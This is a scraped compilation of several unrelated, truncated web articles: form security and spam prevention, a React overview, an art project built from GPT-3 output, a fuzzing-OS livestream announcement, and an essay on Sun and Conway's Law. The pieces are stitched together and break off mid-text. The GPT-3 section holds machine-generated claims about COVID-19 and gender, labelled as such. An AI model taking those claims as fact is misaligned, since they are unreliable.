&lt;/form&gt;</pre> </div> <p>Notice how submitting this form also loads example.com, but this time there is nothing in the query parameters. That’s because on a <code>POST</code> request, data is sent as part of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Request" rel="noopener">request</a> body. This makes it more difficult to accidentally leak private information.</p> <p>As a rule of thumb, I use the <code>POST</code> method on all forms for the reasons listed above. The few exceptions to this rule, are if I want to let users bookmark their form submission, or share it with someone else. For example, check out this form that submits search to <a href="https://duckduckgo.com/" rel="noopener">DuckDuckGo</a>:</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://duckduckgo.com/" method="GET" target="_blank"&gt;
  &lt;label for="query"&gt;Search&lt;/label&gt;
  &lt;input id="query" name="q"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
&lt;/form&gt;</pre> </div> <p>After the form is submitted, DuckDuckGo will open with a query parameter in the URL. Then you could, if you wanted, copy this URL and share it with a colleague, or bookmark it for later. This pattern can very useful to keep it in mind unless you’re dealing with sensitive data.</p> <h2><span id="Prevent_Spam"></span>Prevent Spam<span></span></h2> <p>No one likes spam. And I’ll admit it’s only marginally related to security. It’s worth mentioning here because any time we add a form to a public web page, we are opening up the doors to spam. Forms are meant to be filled out, but sometimes they get filled out by someone, or some<strong>thing</strong>, for nefarious reasons.</p> <p>So how do we prevent it?</p> <h3><span id="Honeypots"></span>Honeypots<span></span></h3> <p>One rudimentary way of preventing spam is called a “<a href="https://en.wikipedia.org/wiki/Honeypot_(computing)" rel="noopener">honeypot</a>” and the concept is quite simple. If you include a hidden input in your form, you know that a real human should never modify that field. Therefore, if the form is submitted with data for that input, you can assume it was a bot and reject the submission.</p> <p>In practice, here’s what that input might look like:</p> <pre>&lt;input name="honeypot" class="visually-hidden" tabindex="-1" autocomplete="off"&gt;</pre> <ul><li>The <code>name</code> is important so you know what to check on the backend. I used ‘honeypot’, but most folks would recommend calling it something that sounds more legitimate.</li><li>I used a <code>visually-hidden</code> class to hide the input from users (you can read more about this in the article on <a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">accessibility</a> or <a href="https://austingil.com/build-html-forms-right-styling/">styling</a>). Bots will still see it.</li><li>The <code>tabindex="-1"</code> removes the input from keyboard navigation. This is important for assistive technology users (more on this in the <a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">accessibility post</a>).</li><li>Finally, we want to prevent the browser form filling the input automatically, so we disable <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete" rel="noopener"><code>autocomplete</code></a>.</li></ul> <p>The good news about this approach is that it can cost very little time and effort to implement. The bad news is that many bots are smart enough to tell when an input is a honeypot and they will skip over it. But hey, even if this stops 10% of spam, the level of effort is worth it.</p> <h3><span id="Security_Challenge"></span>Security Challenge<span></span></h3> <p>A more robust way of preventing spam is to include a challenge that users need to complete to prove they are human. Some basic examples are inputs that ask you to complete an easy math question like “What is 10 + 6?”. Only data with the correct answer will be accepted.</p> <p>The problem with this method is that, once again, bots can be sophisticated enough to solve these challenges.</p> <p>The spam dilemma is a constantly evolving game of cat and mouse that has seen challenges become more complex through time. First math questions, then detecting letters or numbers in images.</p> <p>Probably the most familiar security challenge is <a href="https://developers.google.com/recaptcha/" rel="noopener">reCAPTCHA</a>. It’s a service now owned by Google that shows users a bunch of images they need to identify. It works very well, and it’s free. If you are concerned about user-privacy, you may not want to use Google products. The good news is that there is another service called <a href="https://www.hcaptcha.com/" rel="noopener">hCaptcha</a> which is a drop-in replacement. The security challenge technique is not without downsides:</p> <ul><li>They are more technical to implement.</li><li>You may need to rely on a 3rd party service.</li><li>They can have a negative impact on <a href="https://austingil.com/build-html-forms-right-user-experience/">user experience</a>.</li></ul> <h3><span id="WAF_APIs"></span>WAF &amp; APIs<span></span></h3> <p>If spam is becoming a major issue in your forms, you may want to consider reaching for a 3rd party service.</p> <p>One option is to set up a <a href="https://en.wikipedia.org/wiki/Web_application_firewall" rel="noopener">Web Application Firewall (WAF)</a>. A WAF sits in front of your server and prevents traffic from bad actors getting to your website in the first place.</p> <p><a href="https://www.cloudflare.com/" rel="noopener">Cloudflare</a> is my preferred vendor. They work at the DNS level and have a very generous free tier. I use this on every domain I own, and so far I haven’t had any problem with spam.</p> <p>Another option is to use an API service to test incoming form submissions. The most common one I know is <a href="https://akismet.com/development/api/" rel="noopener">Akismet</a> which is part of the <a href="https://automattic.com/" rel="noopener">Automattic</a> products (they make <a href="https://wordpress.org/" rel="noopener">WordPress</a>). I’ve used this on some WordPress sites and can say that it works well. They also have an API if you don’t use WordPress. CSS Tricks has <a href="https://css-tricks.com/spam-detection-apis/" rel="noopener">an article</a> that goes into more depth on 3rd party spam APIs if you’re interested in other options.</p> <p>I wouldn’t trust any spam prevention technique to be 100% guaranteed. The field is ever-evolving with spammers getting more advanced every year. However, it’s also not the sort of problem I would try to solve until I have it. In which case, you can start with some of the low-hanging fruit and work your way up to a more involved solution.</p> <p>Considering the level of effort, user experience, cost, and everything else, I would approach things like this:</p> <ol><li>Setup Cloudflare on your DNS (or some …</li></ol></div></div></article></div>

December 7, 2020 | https://blog.graphqleditor.com/react-js-powerhouse/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/react-js-powerhouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After taking a look at <a href="https://blog.graphqleditor.com/vue-overview/">Vue</a> and <a href="https://blog.graphqleditor.com/angular-overview/">Angular</a> it’s time to check out the last of the big three -  <strong>React</strong>. </p>
<p>In terms of popularity and user base it might be the biggest of the three so let’s look at how it got here. It’s also worth mentioning there has been a lot of discussion on if React is a framework or a library, with both sides of the argument nitpicking the definitions. How you call it isn’t really of the utmost importance when you’re actually using it, so let’s just call it a library since that’s how it’s referred to on its official website.</p>
<h2>Hello World!</h2>
<p>React was created by Jordan Walke, a software engineer working for Facebook and it first appeared as FaxJS in 2011. The same year it got its first use in Facebook’s newsfeed and a year later on Instagram.com. May 2013 saw the big launch with React becoming opensource and publicly available, it was a bit of a rocky start with many being sceptical about its usefulness. Later the same year it became available in Python Applications and Ruby on Rails. By 2014 was steadily gaining users and the community started growing quickly. 2015 was the big break and the start of mainstream recognition as big companies like Netflix and Airbnb started using the library. The following years saw numerous improvements with the most recent version 17.0 coming out on October 20 2020.</p>
<h2>JSX and Virtual DOM</h2>
<p>Shedding some light on the background is fine and all, but the main ‘selling point’ (don’t worry, it’s opensource) of the library are its features. React is basically a frontend library aimed at helping developers build user interfaces. The most basic advantage, as with any library, is that it provides reusable code which saves time and reduces the chances of coding errors. Obviously that’s not all it does, ever since its initial release two features have been the backbone of React</p>
<ul>
<li><strong>JSX:</strong> React uses JSX (a syntax extension to JavaScript) instead of basic JavaScript for templating. It lets you easily modify the DOM using simple HTML-style code and is compatible with all web browsers.</li>
<li><strong>Virtual DOM:</strong> React creates a data structure cache which traces the changes made and then updates only the relevant part of the DOM. Let’s say a user leaves a comment under the article, normally for it to appear the entire DOM would have to be updated, while React scans the DOM for changes and updates only the relevant segment. This makes for an important performance boost since it means way less computing power used and significantly shorter loading time. While that might not sound like much, think about the scale, we’re talking here about something made for Facebook and not some small blog with a handful of users commenting.</li>
</ul>

<h2>Going native</h2>
<p>With the basic features out of the way we can look at some things that were added later. React Native was released in March 2015 letting developers create natively-rendered apps for iOS, Android and a multitude of other platforms. It quickly became one of the most used tools for mobile app development and was adopted by big companies like Skype, Soundcloud, Ubereats or Walmart. What’s the difference? Well ReactJS still uses some CSS and HTML elements while React Native uses native mobile UI elements. As cross-platform is very highly valued in mobile development it’s little wonder why it quickly became so popular.</p>

<h2>Hooks</h2>
<p>The new feature in version 16.8 released early last year was adding Hooks. Hooks are basically functions that let you use state and other React features without writing a class component. This way you can ‘hook into’ React and use state and lifecycle methods inside functional components. They are reusable and provide better code composition and flexibility in moving around the component tree. With Hooks functional components can be used for almost everything from rendering UI to handling state and logic. You’ll find some built-in Hooks shipped with React and since they are reusable you’ll find lots of useful ones created by others or you can always create your own. There are two main rules to Hooks:</p>
<ul>
<li><strong>Do not use Hooks inside loops, conditions, or nested functions</strong> - this ensures that Hooks are called in the right order each time a component renders and their state is preserved between multiple calls.</li>
<li><strong>Only use Hooks from inside React Functions</strong> - this ensures all stateful logic in a component is clearly visible from the source code.</li>
</ul>

<h2>More to come</h2>
<p>Version 17.0 was released about a month and a half ago and it was the first major release without any developer-facing features. The update was primarily focused on making it easier to upgrade React itself. It’s not like that’s it though, the team even called this update a stepping stone while they work on new features. So if those mentioned above did not convince you there’s more coming soon. Oh and if you’re up for some more convincing, next time we’ll take a look at some of the most useful component libraries for React.</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs.

<h3>0. Intro</h3>
<p>The end of trends has been heralded by various outlets for years (see <a href="https://www.npr.org/2011/02/09/133616425/the-end-of-trends-if-its-hot-its-over?t=1603812659117">here</a>, <a href="https://www.wmagazine.com/story/fashion-trends-2017-retail-buyers/">here</a> and many more on our <a href="https://are.na/nemesis/the-end-of-trends">Are.na channel</a>).</p>
<p>But COVID time is crazy. We had a hunch that the hype cycle itself was finally in its true death throes – related to economic collapse, popular uprising, a general sense of consumer fatigue, and the breakdown of a consensus reality in which such trends could incubate. Since trends are a temporal phenomenon (they have to start, peak, fade away, typify a time, bottle the zeitgeist, etc.) we began with a simple survey about the breakdown of narrative time, first circulated through our personal social media accounts. We asked the following three questions:</p>
<ul>
<li><strong>How would you describe the time we live in?</strong></li>
<li><strong>What does the future hold?</strong></li>
<li><strong>What was life like 10 years ago?</strong></li>
</ul>
<p>Then we ran the same questions through an online survey distributed to 150 randomly chosen respondents, deployed in collaboration with <a href="http://g-r-l.com/">General Research Laboratories</a>. These responses, which will likely appear in a future memo, ranged from deeply personal to millenarian to an extreme form of ‘new optimism’.</p>
<p>Then our process took a crazier turn. In July 2020, OpenAI released <a href="https://en.wikipedia.org/wiki/GPT-3">GPT-3</a> for beta testing – a natural language processing system (colloquially, an “AI”) that uses deep learning to produce human-like text. <strong>K Allado-McDowell</strong>, writer, co-founder of the Artists + Machine Intelligence program at Google AI and friend of Nemesis, had started doing experimental collaborative writing with GPT-3. By exploring its quirks, K was already building an empirical understanding of GPT-3’s ability to articulate the nature of consciousness, memory, language, and cosmology. (K’s book <strong>Pharmako-AI</strong>, co-written with GPT-3, <a href="https://ignota.org/products/pharmako-ai">is forthcoming from Ignota Books</a>).</p>
<p>We were drawn to the oracular quality of the text generated by GPT-3, and became curious about how it could interact with the material we had gathered.</p>
<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/dd4021bd4b-1603977541/kishkindha-forest-1.png"></figure>
<p><strong>Generative Pre-trained Transformer 3</strong> is the third-generation language prediction model in the GPT-n series created by <a href="https://openai.com/">OpenAI</a>. It has a capacity of 175 billion machine learning parameters, which is two orders of magnitude more than its predecessor GPT-2, which already had some <a href="https://slatestarcodex.com/2020/01/06/a-very-unlikely-chess-game/">astonishing capabilities</a>. In a crudely simplified sense, GPT-3 was trained by reading the entire Internet (or at least a non-trivial portion of it). Within limits which are currently being <a href="https://www.gwern.net/GPT-3">explored</a>, the quality of the text generated by GPT-3 is so high that it is <a href="https://www.theguardian.com/commentisfree/2020/sep/08/robot-wrote-this-article-gpt-3?fbclid=IwAR3BnzQRDBsDdYqo_bY7grkK2j-BmQjXWueIyvQMnsWs6MFz4PsMvm72hAg">difficult or impossible</a> to distinguish from that written by a human.</p>
<p>Meanwhile, our examination of the end-of-trends had us thinking about “trend forecasting” as early 21st-century vernacular for cultural analysis and the corporate performance of futurity. We knew the concept had largely been made redundant by data farming, think pieces, memes, and rampant B.S. So instead of using our survey results to write more baseless claims about a perilous future, we took another tack. </p>
<p>With the generous help of K – who had quickly become a skilled GPT-3 whisperer – we began feeding it our survey results, in the form of essayistic synopses that summarized the key points of the respondents and quoted choice answers. We left open-ended, future-facing sentence fragments at the end of these and let GPT-3 fill in the rest, like a demented version of Gmail’s suggestive text feature. K ran the experiment via screenshare, tweaking the levers controlling the randomness and creativity of GPT-3’s output. Not every roll of the GPT-3 dice yielded equivalent results. Some were loopy, repetitive or on the gibberish spectrum. But with subsequent tweaks to the sentence fragments we used to seed it, as well as trimming back excess text and hitting “generate” again, we started to receive some interesting results. Then we began feeding some of the more exciting concepts back into the machine, improvising the inputs and departing from our original survey synopses. We also threw in the beginning of our last memo, The Umami Theory of Value, and let GPT-3 fill in the rest. </p>
<p>As we worked, GPT-3 quickly recognized the genre of our undertaking: a report concerned with the future written by some kind of consultancy, expert group, or think tank. So it inadvertently rebranded us, naming this consultancy <strong>DOOM!</strong>:</p>
<p>“Our goal at DOOM! will be to consider a plurality of futures and then doing everything that we can to prevent nuclear war, oblivion and ruin.”</p>
<p>In some oblique way, that is ultimately what’s at stake in this report.</p>
<p>What follows is a text collaboratively composed by Nemesis, GPT-3, K Allado-McDowell and our survey respondents, but arguably authored by none of us, per se. Instead you could say this report was written by the <a href="https://en.wikipedia.org/wiki/The_Third_Mind">“third mind”</a> of DOOM! which spontaneously arose when we began to process this information together with the conscious goal of generating predictions about the future. The outputs of our GPT-3 experiments have been trimmed, edited for grammar, minorly tweaked and ordered into numbered chapters. All text in <span>yellow</span> is GPT-3’s output. Emphasis in <strong>bold</strong> is by us. Paintings by <a href="https://www.matthewmarks.com/new-york/artists/leidy-churchman/">Leidy Churchman</a>.</p>

<h3>1. DOOM!</h3>
<p>Our goal at DOOM! will be to consider a plurality of futures and then do everything that we can to prevent nuclear war, oblivion and ruin.</p>

<h3>2. JAWS OF CHAOS</h3>
<div>
<p>As trend forecasters we predict <strong>Future Radicalization</strong> will only increase and hasten what is to come: a downward spiral that will intensify, accelerate, and accelerate more until it reaches what some call the “<strong>Jaws of Chaos.</strong>” Only then will the system give way and turn into something completely different.</p>
<p>This transformation through the “Jaws of Chaos” will affect business in three key ways:</p>
<ul>
<li>it will bring a new set of organizational models; </li>
<li>it will change the way we think about the value of the human being; </li>
<li>it will bring new forms of finance, which will enable new forms of business, and in turn, new forms of human interaction.</li>
</ul>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/99730aa756-1603900195/leidy3.png"></figure>

<h3>3. TEMPORAL SCHISM</h3>
<div>
<p>There are several possible futures that meet the description of a post-post-apocalyptic world, but there is no way to know if any of them will materialize. </p>
<p>The easiest way to think about this is to ask yourself, “<strong>what’s the least stable, most destructive, and least predictable future I can imagine?</strong>” </p>
<p>In this way, an apocalypse is defined as a radical restructuring of the world, to the point that it creates <strong>an irreconcilable schism between the past and the present</strong>.</p>
</div>

<h3>4. PEAK EVERYTHING</h3>
<p>Just a few years ago, foreseeing dark times might have been seen as alarmist. It was common to hear people say “don’t worry, we’ve got a plan…” However, the COVID-19 pandemic came and materialized in full-blown fashion on our doorsteps, and there appears to be no “plan”…possibly not even a hope. There are echoes of <strong>“Peak Everything”</strong> in the responses to our survey: resource scarcity, climate change, systemic collapse, uncontrollable change.</p>

<h3>5. MEGATRENDS (THE BOOK OF PROBLEMS)</h3>
<div>
<p>In the vast interplay of cultural patterns known as “trends”, the highest level of coherence is known as a “mega-trend.” </p>
<p><strong>Mega-trends are mega-problems that affect many levels of human existence.</strong></p>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/ce009fd226-1603900709/large_365aad8aa318d0bb0b90b4019b5a810f-1.jpg"></figure>

<h3>6. GENDER</h3>
<div>
<p>It has been said that today’s teens are the “gender neutral generation”, thus signaling an end to the gendered division between male and female. This is true at a purely anecdotal level, but also true on a more abstract level. <strong>COVID-19 has introduced a sexless threat into the human race, and as a result, gender no longer serves any purpose.</strong> </p>
<p>“Right now, if you walk through the streets and look at everyone you see, and try to guess their gender solely based on their clothing, I would say that a good <strong>70-80% of the people you see will end up being the gender the clothes suggest</strong>. In the future, I could see that percentage being much smaller.”</p>
</div>

<h3>7. COVID-19</h3>
<div>
<p>There is a rapid decay of our knowledge of COVID-19.</p>
<p><strong>Every day we know less about COVID-19 than we did yesterday. Thus, the effects of COVID-19 decay. The processes taking place in our world today will lead to a future situation in which our knowledge about COVID-19 will decay. Thus based on the structure of our knowledge, we predict that the effects of COVID-19 will decay.</strong></p>
</div>

<h3>8. DRUGS</h3>
<p>New drugs that stop panic attacks or aid in the creation of false memories are coming to the forefront of the field. </p>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/87709702f7-1603369576/leidy2.jpg"></figure>

<h3>9. FORKING PATHS</h3>
<div>
<p>A forked path is defined as: “a situation or road leading to two or more possibilities or outcomes”. </p>
<p>We see this theme in a few of the longer responses. This one is a bit stilted, but expresses the concern that the apparently opposite situations of ten years ago were not actually opposite:  </p>
<p>“… when I ‘thought’ of the pre-2008 world, I realized that it was only my perception, that it was probably more sinister and dark and irrevocably damaged than I thought. And now, 10 years post, I do not see a ‘forked path,’ but a convergence where we all appear to be on the ‘same path’.” </p>
<p>A quantum understanding of the notion of paths and forking paths implies inevitability. Ten years ago was perhaps an inflection point because it was a time of “impact” in a larger sense. Each response to the survey that describes it as an inflection point is a bit wary of the concept of the <strong>in-ev-it-a-ble</strong>, because it fails to include an understanding of choice, agency, and control.</p>
</div>

<h3>10. THE END OF TRENDS</h3>
<div>
<p>The fractal property of trends and prediction implies a meta-fractal perspective that made a few respondents uncomfortable.</p>
<p>We may be witnessing <strong>the end of the trends in general</strong>. Even what we may be witnessing as a new trend or paradigm may be (a) a higher order statistical cluster, or (b) a continuing trend within a <strong>collapsing paradigm</strong>.</p>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/ecb416eb76-1603896230/leidy.png"></figure>

<h3>12. COMPLEXITY</h3>
<div>
<p>When we think about the definition of complicated, we need to look at two different components: </p>
<ol>
<li>
<p><strong>Complexity, as in the nature of the information problems we face – as they become bigger, they expand to include more and more of the universe (in theory)</strong></p>
</li>
<li>
<p><strong>Control, or the lack thereof</strong></p>
</li>
</ol>
<p>Ten years ago, people thought they …</p></div></div></div></div>

  <div itemprop="articleBody">
    <h2 id="summary">Summary</h2>

<p>We’re going to work on an <em>operating system</em> which is designed specifically for fuzzing! This is going to be a streaming series for most of December which will cover making a new operating system with a strong focus on fuzzing. This means that things like the memory manager, determinism, and scalability will be the most important parts of the OS, and a lot of effort will go into making them super fast!</p>

<h2 id="when">When</h2>

<p>Streaming will start sometime on Thursday, December 10th, probably around 18:00 UTC, but the streams will be at relatively random times on relatively random days. I can’t really commit to specific times!</p>

<p>Streams will likely be 4-5 days a week (probably M-F), and probably 8-12 hours in length. We’ll see, who knows, depends how much fun we have!</p>

<h2 id="where">Where</h2>

<p>You’ll be able to find the streams live on my <a href="https://twitch.tv/gamozo">Twitch Channel</a>, and if you’re unlucky and miss the streams, you’ll be able to find the recordings on my <a href="https://www.youtube.com/user/gamozolabs">YouTube Channel</a>! Don’t forget to like, comment, and subscribe, of course.</p>

<h2 id="what">What</h2>

<p>So… ultimately, I don’t really know what all will happen. But, I can predict a handful of things that we’ll do. First of all, it’s important to note that these streams are not training material. There is no prepared script, materials, flow, etc. If we end up building something totally different, that’s fine and we’re just going with the flow. There is no requirement of completing this project, or committing to certain ways the project will be done. So… with that aside.</p>

<p>We’ll be working on making an operating system, specifically for x86-64 (Intel flavor processors at the start, but AMD should work in non-hypervisor mode). This operating system will be designed for fuzzing, which means we’ll want to focus on making virtual memory management extremely fast. This is the backbone of most performant fuzzing, and we’ll need to be able to map in, unmap, and restore pages as they are modified by a fuzz case.</p>

<p>To keep you on the edge of your toes, I’ll first start with the boring things that we have to do.</p>

<h3 id="os">OS</h3>

<p>We have to make an operating system which boots. We’re gonna make a UEFI kernel, and we might dabble in running it on ARM64 as most of our code will be platform agnostic. But, who knows. It’ll be a pretty generic kernel, I’m mainly going to develop it on bare metal, but of course, we’ll make sure it runs on KVM/Xen/Hyper-V such that it can be used in a cloud environment.</p>

<h3 id="acpi">ACPI</h3>

<p>We’re gonna need to write ACPI table parsers such that we can find the NUMA locality of memory and CPUs on the system. This will be critical to getting a high performance memory manager that scales with cores.</p>

<h3 id="multi-processing">Multi-processing</h3>

<p>Of course, the kernel will support multiple cores, as otherwise it’s kinda useless for compute.</p>

<h3 id="10gbit-networking--tcp-stack">10gbit networking + TCP stack</h3>

<p>Since I never work with disks, I’m going to follow my standard model of just using the network as general purpose whatever. To do this, we’ll need 10gbit network drivers and a TCP stack such that we can communicate with the rest of a network. Nothing too crazy here, we’ll probably borrow some code from <a href="https://github.com/gamozolabs/chocolate_milk">Chocolate Milk</a></p>

<hr>

<h2 id="interesting-stuff">Interesting stuff</h2>

<p>Okay, that stuff was boring, lets talk about the fun parts!</p>

<h3 id="exotic-memory-model">Exotic memory model</h3>

<p>Since we’ll be “snapshotting” memory itself, we need to make sure things like pointers aren’t a problem. The fastest, easiest, and best solution to this, is simply to make sure the memory always gets loaded at the same address. This is no problem for a single core, but it’s difficult for multiple cores, as they need to have copies of the same data mapped at the same location.</p>

<p>What’s the solution? Well of course, we’ll have every single core on the system running it’s own address space. This means there is no shared memory between cores (with some very, very minor execeptions). Not only does this lead to execeptionally high memory access performance (due to caches only being in the exclusive or shared states), but it also means that shared (mutable) memory will not be a thing! This means that we’ll do all of our core synchronization through message passing, which is higher latency in the best case than shared memory models, but with an advantage of scaling much better. As long as our messages can be serialized to TCP streams, that means we can scale across the network without any effort.</p>

<p>This has some awesome properties since we no longer need any locks to our page tables to add and remove entries, nor do we need to perform any TLB shootdowns, which can cost tens thousands of cycles.</p>

<p>I used this model in <a href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html">Sushi Roll</a>, and I really miss it. It had incredibly good performance properties and forced a bit more thought about sharing information between cores.</p>

<h3 id="scaling">Scaling</h3>

<p>As with most things I write, linear scaling will be required, and scaling across the network is just implied, as it’s required for really any realistic application of fuzzing.</p>

<h3 id="fast-and-differential-memory-snapshotting">Fast and differential memory snapshotting</h3>

<p>So far, none of these things are super interesting. I’ve had many OSes that do these things well, for fuzzing, for quite a long time. However, I’ve never made these memory management techniques into a true data structure, rather I use them as needed manually. I plan to make the core of this operating system, a combination of Rust procedural macros and virtual memory management tricks to allow for arbitrary data structure to be stored in a tree-shaped checkpointed structure.</p>

<p>This will allow for fast transitions between different state of the structure as they were snapshotted. This will be done by leveraging the dirty bits in the page tables, and creating an allocator that will allocate in a pool of memory which will be saved and restored on snapshots. This memory will be treated as an opaque blob internally, and thus it can hold any information you want, device state, guest memory state, register state, something completely unrelated to fuzzing, won’t matter. To handle nested structures (or more specifically, pointers in structures which are to be tracked), we’ll use a Rust procedural macro to disallow untracked pointers within tracked structures.</p>

<p>Effectively, we’re going to heavily leverage the hardware’s MMU to differentally snapshot, teleport between, and restore blobs of memory. For fuzzing, this is necessary as a way to hold guest memory state and register state. By treating this opaquely, we can focus on doing the MMU aspects really well, and stop worrying about special casing all these variables that need to be restored upon resets.</p>

<h3 id="linux-emulator">Linux emulator</h3>

<p>Okay, so all of that is kinda to make room for developing high performance fuzzers. In my case, I want this mainly for a new rewrite of vectorized emulation, but to make it interesting for others, we’re going to implement a Linux emulator capable of running QEMU.</p>

<p>This means that we’ll be able to (probably staticially only) compile QEMU. Then we can take this binary, and load it into our OS and run QEMU in our OS. This means we can control the syscall responses to the requests QEMU makes. If we do this deterministically (we will), this means QEMU will be deterministic. Which thus means, the guest inside of QEMU will also be deterministic. You see? This is a technique I’ve used in the past, and works exceptionally well. We’ll definitely outperform Linux’s handling of syscalls, and we’ll scale better, and we’ll blow Linux away when it comes to memory management.</p>

<h3 id="kvm-emulator--hypervisor">KVM emulator + hypervisor</h3>

<p>So, I have no idea how hard this would be, but from about 5 minutes of skimming the interwebs, it seems that I could pretty easily write a hypervisor in my OS that emulates KVM ioctls. Meaning QEMU would just think KVM is there, and use it!</p>

<p>This will give us full control of QEMU’s determinism, syscalls, performance, and reset speeds… without actually having to modify QEMU code.</p>

<h2 id="thats-it">That’s it</h2>

<p>So that’s the plan. An OS + fast MMU code + hypervisor + Linux emulator, to allow us to deterministically run anything QEMU can run, which is effectively everything. We’ll do this with performance likely into the millions of VM resets per second per core, scaling linearly with cores, including over the network, to allow some of the fastest general purpose fuzzing the world has ever seen :D</p>

<h2 id="faq">FAQ</h2>

<p>Some people have asked questions on the internet, and I’ll post them here:</p>

<h3 id="hackernews-q1">Hackernews Q1</h3>

<p>Q:</p>

<div><div><pre><code>Huh. So my initial response was, "why on earth would you need a whole OS for that", but memory snapshotting and improved virtual memory performance might actually be a good justification. Linux does have CRIU which might be made to work for such a purpose, but I could see a reasonable person preferring to do it from a clean slate. On the other hand, if you need qemu to run applications (which I'm really unclear about; I can't tell if the plan is to run stuff natively on this OS or just to provide enough system to run qemu and then run apps on linux on qemu) then I'm surprised that it's not easier to just make qemu do what you want (again, I'm pretty sure qemu already has its own memory snapshotting features to build on).

Of course, writing an OS can be its own reward, too:) 
</code></pre></div></div>

<p>A:</p>

<div><div><pre><code>Oooh, wasn't really expecting this to make it to HN cause it was meant to be more of an announcement than a description.

But yes, I've done about 7 or 8 operating systems for fuzzing in the past and it's a massive performance (and cleanliness) cleanup. This one is going to be like an operating system I wrote 2-3 years ago for my vectorized emulation work.

To answer your QEMU questions, the goal is to effectively build QEMU with MUSL (just to make it static so I don't need a dynamic loader), and modify MUSL to turn all syscalls to `call` instructions. This means a "syscall" is just a call to another area, which will by my Rust Linux emulator. I'll implement the bare minimum syscalls (and enum variants to those syscalls) to get QEMU to work, nothing more. The goal is not to run Linux applications, but run a QEMU+MUSL combination which may be modified lightly if it means a lower emulation burden …</code></pre></div></div></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Back in the mists of time, an early Sun Microsystems employee by the name of John Gage coined the term “the network is the computer” to describe the centrality Sun put on network capabilities when designing their workstations.</p>
<p>As we saw last month in the hardware issue, Sun and other companies were interested in taking existing time-sharing computer designs, and selling customers one such system each. Given that the design of the computer means that multiple people can share one system, you need some way to justify this over-provision of resources. Move attention to the network, then: if everybody can login to access their files, printers, and emails from any of the workstations you deploy, then IT administration becomes part of the facilities department rather than the, well, IT department. The culmination of this design was the SunRay “ultra-thin” client, though that meant Sun had gone back to selling you a single time-sharing computer and multiple access terminals.</p>
<p>Note that Sun were careful to say <em>the</em> network, not <em>our</em> network. Silicon Valley has an egregious history of taking publicly-funded work (i.e. work paid for by US taxes) and enclosing it to create multiple billions of dollars in profit for a few individuals. The most obvious modern example is Google, who commercialised work that was in part funded by NASA and the NSF (as credited in the paper “The Anatomy of a Large-Scale&nbsp;Hypertextual&nbsp;Web Search Engine”).</p>
<p>Sun were no different. In a display of hubris, the founders named the company after the Stanford University Networks project, an effort to connect computers across the campus to the ARPAnet via TCP/IP over Ethernet. Andy Bechtolsheim’s work in designing the SUN workstation was paid for by DARPA and the university’s CS department.</p>
<p>Sun were not the only people to take publicly-funded work from the Stanford campus network and exploit it for private gain. Sandy Lerner, the director of computing facilities in Stanford’s business school, would be forced to resign her position at the university for commercially selling a university-designed network appliance that she had no license to exploit. She subsequently founded a private company to do the same: the Stanford “blue box” became IOS and the company’s name was Cisco.</p>
<p>Anyway, Sun shortened the rather dull phrase “somebody else’s network is the computer we want to profit from” and a marketing catchphrase was born. Oracle (finally a company bootstrapped on the work of its founder) evidently did not agree, or at least could not use the phrase to sue Google, and did not renew the trademark registration on acquiring Sun. Enter Cloudflare, who swooped in with much fanfare to snipe the phrase and use it for something something internet of things.</p>
<p>There is actually a lot packed into that slogan, “the network is the computer”, and lots of information for the software designer. To understand why, let us explore the truth of the statement: <em>why</em> is the network the computer?</p>
<p>It has all to do with Conway’s Law. As frequently stated, <a href="https://en.wikipedia.org/wiki/Conway's_law">Conway’s Law</a> says that organisations design systems that mirror their communication structure. This is usually interpreted very narrowly, meaning that software is designed along the communication structure of the software development team. In fact, Melvin Conway expressed that the word “systems” should be “defined broadly”.</p>
<p>It is common to think of a software product as being a technical system that mediates between two social systems: the system of producers (i.e. the software team) and the system of consumers (i.e. the clients, customers, “users”). In fact, this view comes from the Taylorist image of software creation that was prevalent in the twentieth century. The client’s roles are to know and express what software they need, and to accept our software once we have implemented all their requirements. Our role is to ask the questions that will uncover the requirements correctly and efficiently, and then to mechanistically and efficiently convert those requirements into the expected software.</p>
<p>A holistic and more accurate view of software development sees all three of these “systems” as part of a single social-technical system, in which the interactions between producers and consumers are too important, too frequent, and too nuanced to be externalised as outside factors influencing distinct systems. The software (both its existence and the act of its production) mediates a dialogue between developers and users over the software’s behaviour, in addition to producing a dialectic in which the appearance of the software both challenges existing beliefs about the system in which it is embedded, and shapes a new reality.</p>
<p>An early attempt to move away from the “three systems” model toward the “one system” model can be seen in the <a href="https://agilemanifesto.org/">Manifesto for Agile Software Development</a>. The manifesto maintains two distinct “classes” of actor—the “developer” who has the skill to create software and sells their labour into the software-creation exercise, and the “business” defined as sponsors who control the means by which software is paid for (gold owners) and users who supply the reason for the software’s existence (goal donors). The developers are still the knowledge-work equivalent of hired muscle:</p>
<ul>
<li>Our highest priority is to satisfy the customer through early and continuous delivery of valuable software.</li>
<li>Agile processes harness change for the customer’s competitive advantage.</li>
<li>Working software is the primary measure of progress.</li>
</ul>
<p>Nonetheless, the Agile manifesto describes the act of software creation as an ongoing dialogue between these actors, and requests a fuzzier and more fluid boundary between their domains. Thus, it includes principles describing their interaction:</p>
<ul>
<li>Business people and developers must work together daily throughout the project.</li>
<li>Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely.</li>
</ul>
